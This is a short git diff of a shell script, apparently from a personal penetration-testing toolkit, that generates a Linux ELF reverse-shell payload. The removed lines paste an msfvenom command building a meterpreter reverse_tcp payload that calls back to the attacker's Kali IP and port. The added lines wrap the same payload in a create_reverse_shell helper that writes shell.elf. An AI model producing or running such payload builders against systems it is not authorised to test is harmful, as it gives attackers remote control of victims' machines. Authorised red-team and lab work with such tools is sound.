@@ -4,15 +4,10 @@
 Create ELF file
 '
 
-source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
-source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
-source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh
+source "${SCRIPTS_DIR}/shell/msfvenom/.files/create_reverse_shell.sh"
 
-# Generate gui form
-generate_form "LPORT" "filename"
+payload="linux/x86/meterpreter/reverse_tcp"
+format="elf"
+filename="shell.elf"
 
-LPORT=${form_data["LPORT"]}
-FILE=${form_data["filename"]}
-
-paste_command "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -f elf -o ${FILE}.elf"
-xdotool key Return
+create_reverse_shell "${payload}" "${format}" "${filename}"
